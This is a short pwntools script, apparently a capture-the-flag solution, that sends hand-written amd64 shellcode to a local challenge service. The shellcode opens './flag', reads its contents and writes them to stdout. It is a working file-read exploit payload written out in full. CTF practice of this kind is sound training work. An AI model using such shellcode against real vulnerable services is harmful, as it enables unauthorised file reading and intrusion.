#! /usr/bin/env python
# encoding: utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
# r=remote("127.0.0.1",9999)
r=process(["/bin/bash","-c","python scripts/service.py ./score"])

code=r'''
	mov rax,2
	xor rsi,rsi
	call get_file
	.ascii "./flag\0"
get_file:
	pop rdi
	syscall
	mov rdi,rax
	mov rsi,0x1338000
	mov rdx,0x10
	push 0
	pop rax
	syscall
	mov rdi,1
	push 1
	pop rax
	syscall
	mov rdi,0
	mov rax,0x3c
	syscall
'''
shellcode=asm(code,arch="amd64")

payload=shellcode.ljust(0x1000,"\x00")
r.sendlineafter("Shellcode:\n",payload)
r.sendlineafter("What will you control next?","amd64")
# r.sendlineafter("What will you control next?","mix")
print shellcode.encode("hex")
# r.close()
r.interactive()
